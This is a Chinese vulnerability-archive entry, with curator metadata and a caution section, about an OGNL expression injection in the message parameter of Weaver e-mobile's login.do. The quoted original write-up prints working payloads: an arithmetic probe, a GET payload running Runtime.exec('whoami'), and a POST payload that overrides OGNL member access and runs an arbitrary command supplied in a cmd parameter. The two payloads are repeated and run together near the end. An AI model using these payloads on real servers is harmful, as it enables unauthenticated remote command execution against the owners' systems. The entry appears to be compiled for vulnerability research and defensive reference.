---
source: "白阁文库 BaizeSec/bylibrary"
title: "泛微e-mobile login.do message OGNL表达式注入"
product: "泛微e-mobile"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "实测5.0声称；Apache/Resin环境描述模糊"
prerequisites: "登录错误页面前台参数"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEe-mobile%20ognl%E6%B3%A8%E5%85%A5.md"
id: "vw-7a06c9d4c5953913565ab901"
entity_id: "ve-7a06c9d4c5953913565ab901"
schema_version: "1"
---

# 泛微e-mobile login.do message OGNL表达式注入

## 条目说明

- 对象与具体问题：泛微e-mobile；login.do message OGNL表达式注入
- 版本、配置及部署条件：实测5.0声称；Apache/Resin环境描述模糊
- 认证与权限前提：登录错误页面前台参数
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 两段几乎重复叙述和PoC粘连，缺截图/原文/补丁
- 作者自己不确定与S2-045关系，不能录为该CVE或声称Resin通杀
- 算术回显支持表达式求值，RCE需响应和OGNL安全配置/JDK条件；标题根因较明确

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

### 泛微e-mobile ognl注入

泛微 E-Mobile 表达式注入?大概?这个洞是一个月以前，老师丢给我玩的，叫我学习一下。
拿到的时候一脸懵逼，什么是表达式注入?去漏洞库看了一圈。
(・。・) 噢！原来可以执行算术运算就是表达式注入呀！
要怎么玩？当计算器用么？～ヾ(*´∇`)ﾉ

一、泛微OA E-Mobile WebServer:**Apache** 通用部分:**apache**
官方有两个OA。一个是**apache**的 一个是**Resin**的。
**Resin**的也找到姿势通杀了，但是**Resin**涉及的站太大了。。。暂时不放出来，因为好像和S2撞洞了？因为045打了WAF的 ，我这个可以执行命令。23333 我也不知道~

```
1、登录页面如下

http://6.6.6.6/login.do?
or
http://6.6.6.6/login/login.do?
```


```
2、当账号密码报错的时候，出现如下URL
login.do?message=104&verify=
```


```
3、直接改写message=的内容，试试算术运算。
http://6.6.6.6/login.do?message=66*66*66-66666
```


```
4、表达式注入。
有的表达式注入是${code}。这里隐藏了${}，所以直接调用就行了。
message=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())
```


```
5、也可以通过`post`提交数据来进行注入，命令执行
`post`如下数据也可以：
message=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&cmd=whoami
```


====================================================================

网络实例


此版本为5.0

首先随便输入账号密码看提示信息


提示为104，地址栏message也显示了104,现在测试一下看看有没有注入

直接获取数据法: 加减乘除

表达式获取数据语法："${标识符}"，但在这个中并不需要${}来包括

- 

```
http://www.xxx.com/login.do?message=104-2&verify=
```


结果可以被执行成功，表示漏洞存在可注入

这里有两个poc可利用

```
message=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())下面需要Post请求message=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&cmd=whoami
```


---

> 来源：白阁文库 BaizeSec/bylibrary
